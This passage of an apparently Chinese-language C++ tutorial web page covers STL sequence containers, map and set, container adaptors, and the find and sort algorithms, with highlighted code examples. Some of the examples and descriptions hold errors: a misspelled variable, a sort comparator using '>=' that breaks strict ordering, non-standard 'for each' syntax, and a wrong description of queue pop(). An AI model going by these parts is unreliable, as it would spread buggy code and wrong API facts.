class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- string容器一些操作  --------------------*/</span></span><br><span class="line">    string str1 = <span class="string">&quot;Hello Ace&quot;</span>;            <span class="comment">// string的几种构造方法</span></span><br><span class="line">    <span class="function">string <span class="title">str2</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span></span>;        </span><br><span class="line">    <span class="function">string <span class="title">str3</span><span class="params">(str1, <span class="number">6</span>)</span></span>;                <span class="comment">// 从str1下标6开始构造， str3 -&gt; Ace</span></span><br><span class="line"></span><br><span class="line">    string str4 = str2.<span class="built_in">substr</span>(<span class="number">0</span>, <span class="number">5</span>);    <span class="comment">// 求子串： str4 -&gt; Hello</span></span><br><span class="line">    string str5 = str2.<span class="built_in">substr</span>(<span class="number">6</span>);        <span class="comment">// 求子串： str5 -&gt; World</span></span><br><span class="line">    string str6 = str2.<span class="built_in">substr</span>(<span class="number">6</span>, <span class="number">11</span>);    <span class="comment">// 求子串： str6 -&gt; World</span></span><br><span class="line">    <span class="comment">// string str7 = str2.substr(12);    // 抛异常： out_of_range</span></span><br><span class="line"></span><br><span class="line">    string str8 = str2.<span class="built_in">replace</span>(<span class="number">6</span>, <span class="number">5</span>, <span class="string">&quot;Game&quot;</span>);    <span class="comment">// 替换：str8 -&gt; Hello Game 从位置6开始，删除5个字符，并替换成&quot;Game&quot;</span></span><br><span class="line"></span><br><span class="line">    string str9 = str2.<span class="built_in">append</span>(<span class="string">&quot;, Hello Beauty&quot;</span>);<span class="comment">// 追加字符串： str9 -&gt; Hello World, Hello Beauty</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> pos1 = str1.<span class="built_in">find</span>(<span class="string">&quot;Ace&quot;</span>);                <span class="comment">// 查找字符串    : pos1 -&gt; 6 ,返回第一次出现字符串的位置，如果没找着，则返回npos</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = str1.<span class="built_in">compare</span>(<span class="string">&quot;Hello, Ace&quot;</span>);        <span class="comment">// 比较字符串： res -&gt; -1, 根据str1是等于、大于还是小于参数指定的字符串， 返回0、整数或者负数</span></span><br><span class="line"></span><br><span class="line">    string str10 = <span class="string">&quot;Pi = 3.14159&quot;</span>;</span><br><span class="line">    <span class="type">double</span> pi = <span class="built_in">stod</span>(str10.<span class="built_in">substr</span>(str10.<span class="built_in">find_first_of</span>(<span class="string">&quot;+-.0123456789&quot;</span>)));    <span class="comment">// 数值转换： pi -&gt; 3.14159</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- deque容器一些操作  --------------------*/</span></span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; d1;</span><br><span class="line">    d1.<span class="built_in">push_back</span>(<span class="number">1</span>);                            <span class="comment">// 尾后压入元素</span></span><br><span class="line">    d1.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    d1.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    d1.<span class="built_in">push_front</span>(<span class="number">4</span>);                            <span class="comment">// 队头压入元素</span></span><br><span class="line">    d1.<span class="built_in">push_front</span>(<span class="number">5</span>);</span><br><span class="line">    d1.<span class="built_in">push_front</span>(<span class="number">6</span>);</span><br><span class="line">    d1.<span class="built_in">pop_back</span>();                                <span class="comment">// 尾后弹出一个元素</span></span><br><span class="line">    d1.<span class="built_in">pop_front</span>();                                <span class="comment">// 队头弹出一个元素</span></span><br><span class="line"></span><br><span class="line">    d1.<span class="built_in">front</span>();                                    <span class="comment">// 取队头元素</span></span><br><span class="line">    d1.<span class="built_in">back</span>();                                    <span class="comment">// 取队尾元素</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- list容器一些操作  --------------------*/</span></span><br><span class="line">    list&lt;<span class="type">int</span>&gt; l;</span><br><span class="line">    l.<span class="built_in">push_back</span>(<span class="number">1</span>);                                <span class="comment">// 尾后压入元素</span></span><br><span class="line">    l.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    l.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    l.<span class="built_in">push_front</span>(<span class="number">4</span>);                            <span class="comment">// 队头压入元素</span></span><br><span class="line">    l.<span class="built_in">push_front</span>(<span class="number">5</span>);</span><br><span class="line">    l.<span class="built_in">push_front</span>(<span class="number">6</span>);</span><br><span class="line">    l.<span class="built_in">pop_back</span>();                                <span class="comment">// 尾后弹出一个元素</span></span><br><span class="line">    l.<span class="built_in">pop_front</span>();                                <span class="comment">// 队头弹出一个元素</span></span><br><span class="line">    l.<span class="built_in">front</span>();                                    <span class="comment">// 取队头元素</span></span><br><span class="line">    l.<span class="built_in">back</span>();                                    <span class="comment">// 取队尾元素</span></span><br><span class="line"></span><br><span class="line">    l.<span class="built_in">insert</span>(l.<span class="built_in">begin</span>(), <span class="number">88</span>);                    <span class="comment">// 某个位置插入元素(性能好)</span></span><br><span class="line">    l.<span class="built_in">remove</span>(<span class="number">2</span>);                                <span class="comment">// 删除某个元素(和所给值相同的都删除)</span></span><br><span class="line">    l.<span class="built_in">reverse</span>();                                <span class="comment">// 倒置所有元素</span></span><br><span class="line">    l.<span class="built_in">erase</span>(--l.<span class="built_in">end</span>());                            <span class="comment">// 删除某个位置的元素(性能好)</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- forward_list容器一些操作  --------------*/</span></span><br><span class="line">    forward_list&lt;<span class="type">int</span>&gt; fl = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    fl.<span class="built_in">push_front</span>(<span class="number">0</span>);                <span class="comment">// 压入元素，该容器没有push_back方法</span></span><br><span class="line">    <span class="keyword">auto</span> prev = fl.<span class="built_in">before_begin</span>();    <span class="comment">// 表示fl的&quot;首前元素&quot;</span></span><br><span class="line">    <span class="keyword">auto</span> curr = fl.<span class="built_in">begin</span>();            <span class="comment">// 表示fl的第一个元素</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历</span></span><br><span class="line">    <span class="keyword">while</span> (curr != fl.<span class="built_in">end</span>())        <span class="comment">// 表示仍有元素要处理</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*curr % <span class="number">2</span>)                <span class="comment">// 若元素为奇数，则删除</span></span><br><span class="line">        &#123;</span><br><span class="line">            curr = fl.<span class="built_in">erase_after</span>(prev);    <span class="comment">// 删除它并移动curr</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            prev = curr;            <span class="comment">// 移动迭代器curr，指向下一个元素，prev指向curr之前的元素</span></span><br><span class="line">            ++curr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 操作后： fl = &#123;0, 2, 4, 6, 8&#125;</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- array容器一些操作  --------------------*/</span></span><br><span class="line">    array&lt;<span class="type">int</span>, 5&gt; myArray1 = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;    <span class="comment">// 定义一个一维数组</span></span><br><span class="line">    array&lt;array&lt;<span class="type">int</span>, 2&gt;, 3&gt; myArray2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;    <span class="comment">// 定义一个二维数组</span></span><br><span class="line">    array&lt;<span class="type">int</span>, 5&gt; myArray3 = &#123;<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    array&lt;<span class="type">int</span>, 5&gt; myArray4;                <span class="comment">// 此数组并未初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// array.resize();        // array 不能有改变容器大小的操作，它的效率比vector高</span></span><br><span class="line">    myArray1.<span class="built_in">swap</span>(myArray3);<span class="comment">// 交换两个数组的的元素</span></span><br><span class="line">    myArray4 = myArray1;    <span class="comment">// 支持直接这样赋值，原生的数组不可以这样。它把值全部复制过去，而不是引用</span></span><br><span class="line">    myArray1.<span class="built_in">assign</span>(<span class="number">0</span>);        <span class="comment">// 把myArray1的元素全部置为0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历数组元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; myArray1.<span class="built_in">size</span>(); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; myArray1[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关联容器</strong></p>
<p>关联容器(associative-container)和顺序容器有着根本的不同：关联容器中元素定义是按关键字来保存和访问的。与之相对，顺序容器中的元素是按他们在容器中的位置来顺序保存和访问的。虽然关联容器的很多行为和顺序容器相同，但其不同之处反映了关键字的作用。</p>
<p>关联容器支持高效的关键字查询和访问。标准库一共定义了8个关联容器，最主要的类型是map和set。8个容器中，每个容器：</p>
<ul>
<li><p>是一个map或者是一个set。map保存关键字-值对；set只保存关键字。</p>
</li>
<li><p>要求关键字唯一或者不要求。</p>
</li>
<li><p>保持关键字有序或者不保证有序。</p>
</li>
</ul>
<p><strong>关联容器类型：</strong></p>
<p>按关键字有序保存元素</p>
<ul>
<li><p>map : 关联数组；保存关键字-值对</p>
</li>
<li><p>set : 关键字即值，即只保存关键字的容器</p>
</li>
<li><p>multimap : 关键字可重复的map</p>
</li>
<li><p>multiset ：关键字可重复的set</p>
</li>
</ul>
<p>无序集合</p>
<ul>
<li><p>unordered_map ： 用哈希函数组织的map</p>
</li>
<li><p>unordered_set : 用哈希函数组织的set</p>
</li>
<li><p>unordered_multimap ： 哈希组织的map;关键字可以重复出现</p>
</li>
<li><p>unordered_multiset : 哈希组织的set;关键字可以重复出现</p>
</li>
</ul>
<p>从上面的容器名称可以看出：允许重复关键字的容器名字都包含multi；而使用哈希技术的容器名字都以unordered开头。</p>
<p><strong>pair类型</strong></p>
<p>使用关联容器，绕不开pair类型。它定义在标准库头文件utility中。一个pair保存两个数据成员。类似容器，pair是一个用来生成特定类型的模板。当创建pair时，我们必须提供两个类型名，pair的成员将具有对应的类型。与其他标准库类型不同，pair的数据成员是public的。两个成员分别命名为first和second。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pair&lt;string, string&gt; author&#123;&quot;Stanley&quot;, &quot;C++ Prime&quot;&#125;;    // 构造一个pair</span><br><span class="line"></span><br><span class="line">make_pair(v1, v2);                                        // 返回一个用v1和v2初始化的pair。pair的类型从v1和v2的类型推断出来</span><br></pre></td></tr></table></figure>
<p><strong>map的使用</strong></p>
<p>下面的程序是统计每个单词在输入中出现的次数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 统计每个单词在输入中出现的次数</span></span><br><span class="line">    map&lt;string, <span class="type">size_t</span>&gt; word_count;        <span class="comment">// string到map的空map</span></span><br><span class="line">    string word;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; word)</span><br><span class="line">    &#123;</span><br><span class="line">        ++word_count[word];                <span class="comment">// 提取word的计数器并将其加1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;w : word_count)    <span class="comment">// 遍历map的每个元素</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; w.first &lt;&lt; <span class="string">&quot;出现的次数为: &quot;</span> &lt;&lt; w.second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>set的使用</strong></p>
<p>对上面那个统计单词的程序做一个扩展，忽略常见单词。比如 the and or then等。 我们使用set保存想要忽略的单词，只对不在集合中的单词进行统计。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 统计每个单词在输入中出现的次数</span></span><br><span class="line">    map&lt;string, <span class="type">size_t</span>&gt; word_count;        <span class="comment">// string到map的空map</span></span><br><span class="line">    set&lt;string&gt; exclude = &#123;<span class="string">&quot;The&quot;</span>, <span class="string">&quot;But&quot;</span>, <span class="string">&quot;And&quot;</span>, <span class="string">&quot;Or&quot;</span>, <span class="string">&quot;An&quot;</span>, <span class="string">&quot;A&quot;</span>, </span><br><span class="line">                            <span class="string">&quot;the&quot;</span>, <span class="string">&quot;but&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;an&quot;</span>, <span class="string">&quot;a&quot;</span>&#125;;</span><br><span class="line">    string word;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; word)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 只统计不在exclude中的单词。find调用返回一个迭代器，如果在集合中，返回的迭代器指向其该关键中。否则返回尾后迭代器</span></span><br><span class="line">        <span class="keyword">if</span> (exclude.<span class="built_in">find</span>(word) == exclude.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            ++word_count[word];                <span class="comment">// 提取word的计数器并将其加1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;w : word_countm)    <span class="comment">// 遍历map的每个元素</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; w.first &lt;&lt; <span class="string">&quot;出现的次数为: &quot;</span> &lt;&lt; w.second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="容器适配器"><a href="#容器适配器" class="headerlink" title="容器适配器"></a>容器适配器</h3><p>除了顺序容器外，标准库还定义了三个顺序容器适配器:<strong>stack、 queue</strong>和<strong>priority_queue</strong>。 适配器(adaptor)是标准库的一个通用概念。容器、迭代器和函数都有适配器。</p>
<blockquote>
<p>本质上，一个适配器是一种机制，能使某种事物的行为看起来像另一种事物一样。</p>
</blockquote>
<p><strong>所有容器适配器都支持的操作和类型</strong></p>
<ul>
<li><p>size_type : 一种类型，足以保存当前类型的最大对象的大小</p>
</li>
<li><p>value_type : 元素类型</p>
</li>
<li><p>container_type : 实现适配器的底层容器类型</p>
</li>
<li><p>A a : 创建一个名为a的空适配器</p>
</li>
<li><p>A a(c) : 创建一个名为a的适配器，带有容器c的一个拷贝</p>
</li>
<li><p>关系运算符 : 每个适配器都支持所有关系运算符： &#x3D;&#x3D;、！&#x3D;、&lt;、&lt;&#x3D;、&gt;、和&gt;&#x3D;。这些运算符返回底层容器的比较结果。</p>
</li>
<li><p>a.empty() ： 若a包含任何元素，返回fasle，反正返回true</p>
</li>
<li><p>a.size() : 返回a中的元素数目</p>
</li>
<li><p>swap(a, b) : 或写作a.swap(b)、b.swap(a)。交换a和b的内容。a和b必须有相同的类型，包括底层容器类型也必须相同</p>
</li>
</ul>
<p><strong>栈适配器(stack)的额外操作</strong></p>
<ul>
<li><p>s.pop() : 删除栈顶元素，但不返回该元素值。</p>
</li>
<li><p>s.push(item) : 创建一个新元素压入栈顶</p>
</li>
<li><p>s.emplace(args) ： 同push，其值由args构造</p>
</li>
<li><p>s.top() ： 返回栈顶元素，但不将元素弹出栈</p>
</li>
<li><p>queue和priority_queue的额外操作</p>
</li>
<li><p>q.pop() : 返回queue的首元素或priority_queue的最高优先级的元素，但不删除此元素。</p>
</li>
<li><p>q.front() : 返回首元素或者尾元素，但不删除此元素</p>
</li>
<li><p>q.back() : 只使用于queue</p>
</li>
<li><p>q.top() : 返回最高优先级元素，但不删除此元素</p>
</li>
<li><p>q.push(item) : 在queue末尾或者priority_queue中恰当的位置创建一个元素，其值为item</p>
</li>
<li><p>q.emplace(args) : 同push,其值由args构造</p>
</li>
</ul>
<blockquote>
<p>栈默认基于deque实现。queue默认基于deque实现。priority_queue默认基于vector实现。</p>
</blockquote>
<p>stack和queue的使用方法比较简单，priority_queue在存储自己定义的数据结构时，必须重载 operator &lt; 或者自己写仿函数。下面给个简单的例子：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MyCmp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 自定义的比较函数</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span> <span class="params">()</span><span class="params">(Node a, Node b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.x == b.x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> a.y &gt; b.y;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> a.x &gt; b.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// priority_queue&lt;Type, Container, Functional&gt;</span></span><br><span class="line">    <span class="comment">// Type 为数据类型，Container 为保存数据的容器，Functional 为元素比较方式</span></span><br><span class="line">    priority_queue&lt;Node, vector&lt;Node&gt;, MyCmp&gt;  myQueue;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加一些元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        Node node;</span><br><span class="line">        node.x = i;</span><br><span class="line">        node.y = i * i;</span><br><span class="line">        myQueue.<span class="built_in">push</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历元素</span></span><br><span class="line">    <span class="keyword">while</span> (!myQueue.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; myQueue.<span class="built_in">top</span>().x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; myQueue.<span class="built_in">top</span>().y &lt;&lt; endl;</span><br><span class="line">        myQueue.<span class="built_in">pop</span>();            <span class="comment">// 出队</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="泛型算法"><a href="#泛型算法" class="headerlink" title="泛型算法"></a>泛型算法</h3><p>虽然容器提供了众多操作，但有些常见的操作，比如查找特定的元素，替换或者删除某个特定值，重新排序等，这些由一组泛型算法(generic algorithm)来实现。</p>
<p>大多数的算法都定义在头文件algorithm中，有些关于数值的泛型算法定义在numeric这个头文件中。</p>
<p>标准库提供了上百个算法，幸运地是，它们的算法结构基本上是一致的。这样我们就不用死记硬背了。</p>
<p><strong>算法的形参模式</strong></p>
<p>大多数的算法具有如下4种形式之一：</p>
<ul>
<li><p>alg(beg, end, other args);</p>
</li>
<li><p>alg(beg, end, dest, other args);</p>
</li>
<li><p>alg(beg, end, beg2, other args);</p>
</li>
<li><p>alg(beg, end, beg2, end2, other args);</p>
</li>
</ul>
<p>其中alg是算法的名字,beg和end表示算法所操作的输入范围。dest表示指定目的位置,beg2和end2表示接受第二个范围。</p>
<blockquote>
<p>标准算法库对迭代器而不是容器进行操作。因此，算法不能直接添加或者删除元素(可以调用容器本身的操作来完成)。</p>
</blockquote>
<p>find和sort是两个比较常见的泛型算法，我们以这两个为例子，来演示一下泛型算法的使用。</p>
<p><strong>find的简单使用</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> val = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> &#125;;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; vec = &#123; <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">88</span>, <span class="number">99</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找元素的范围是第2个元素到第8个元素，支持内置数组</span></span><br><span class="line">    <span class="comment">// 如果找到想要的元素，则返回结果指向它</span></span><br><span class="line">    <span class="keyword">auto</span> result = <span class="built_in">find</span>(arr + <span class="number">1</span>, arr + <span class="number">7</span>, val);</span><br><span class="line">    cout &lt;&lt; *result &lt;&lt; endl;    <span class="comment">// 输出结果为 5,如果没找到返回7，想一下为什么</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> val2 = <span class="number">100</span>;</span><br><span class="line">    <span class="comment">// 没有找到这个值，返回vec.cend()</span></span><br><span class="line">    <span class="keyword">auto</span> res = <span class="built_in">find</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>(), val2);</span><br><span class="line">    <span class="keyword">if</span> (res == vec.<span class="built_in">cend</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;没找到元素!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *res &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简述一下find的执行步骤</p>
<ol>
<li>访问序列中的元素</li>
<li>比较此元素与我们要查找的值</li>
<li>如果此元素与我们要查找的值匹配，find返回标示此元素的值。</li>
<li>否则,find前进到下一个元素，重复执行步骤2和3。</li>
<li>如果到达序列尾,find停止。</li>
<li>如果find到达序列末尾，它应该返回一个指出元素未找到的值。此值和步骤3中返回的值必须具有相同的类型。</li>
</ol>
<p><strong>sort的简单使用</strong></p>
<p>参数形式为：sort(beg, end, cmp)</p>
<p>对于基本数据类型，第三个参数是可以省略的，有默认的实现。但对于自定义的数据类型，我们要提供第三个参数。第三个参数叫做谓词(predicate)。标准库有一元谓词(unary predicate)和二元谓词(binary predicate)之分，分别表示只接受1个参数和只接受2个参数。</p>
<p>下面实现一个小程序，有语文和数学两门课的成绩，按总分从大到小排序。如果总分相同，数学成绩高的排在前面。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CoureSocre</span></span><br><span class="line">&#123;</span><br><span class="line">    string name;    <span class="comment">// 姓名</span></span><br><span class="line">    <span class="type">int</span> math;        <span class="comment">// 数学成绩</span></span><br><span class="line">    <span class="type">int</span> chinese;    <span class="comment">// 语文成绩</span></span><br><span class="line">    <span class="type">int</span> total;        <span class="comment">// 总成绩</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CoureSocre</span>(string _name, <span class="type">int</span> _math, <span class="type">int</span> _chinese)</span><br><span class="line">    &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        math = _math;</span><br><span class="line">        chinese = _chinese;</span><br><span class="line">        total = math + chinese;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">myCmp</span><span class="params">(CoureSocre c1, CoureSocre c2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 如果总成绩相同</span></span><br><span class="line">    <span class="keyword">if</span> (c1.total == c2.total)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> c1.math &gt;= c2.math;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c1.total &gt; c2.total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化5个学生的程序</span></span><br><span class="line">    <span class="function">CoureSocre <span class="title">c1</span><span class="params">(<span class="string">&quot;Ace&quot;</span>, <span class="number">90</span>, <span class="number">95</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c2</span><span class="params">(<span class="string">&quot;Shawna&quot;</span>, <span class="number">99</span>, <span class="number">100</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c3</span><span class="params">(<span class="string">&quot;Kelly&quot;</span>, <span class="number">100</span>, <span class="number">99</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c4</span><span class="params">(<span class="string">&quot;Jordan&quot;</span>, <span class="number">88</span>, <span class="number">90</span>)</span></span>;</span><br><span class="line">    <span class="function">CoureSocre <span class="title">c5</span><span class="params">(<span class="string">&quot;Kobe&quot;</span>, <span class="number">90</span>, <span class="number">88</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加入容器</span></span><br><span class="line">    vector&lt;CoureSocre&gt; vecScoreList = &#123; c1, c2, c3, c4, c5 &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用sort算法进行排序</span></span><br><span class="line">    <span class="built_in">sort</span>(vecScoreList.<span class="built_in">begin</span>(), vecScoreList.<span class="built_in">end</span>(), myCmp);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;学生的成绩排名为:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="function"><span class="keyword">for</span> <span class="title">each</span> <span class="params">(CoureSocre c in vecScoreList)</span>        <span class="comment">// 使用for each 算法进行遍历</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;姓名:&quot;</span> &lt;&lt; c.name &lt;&lt; <span class="string">&quot;\t总成绩:&quot;</span> &lt;&lt; c.total &lt;&lt; <span 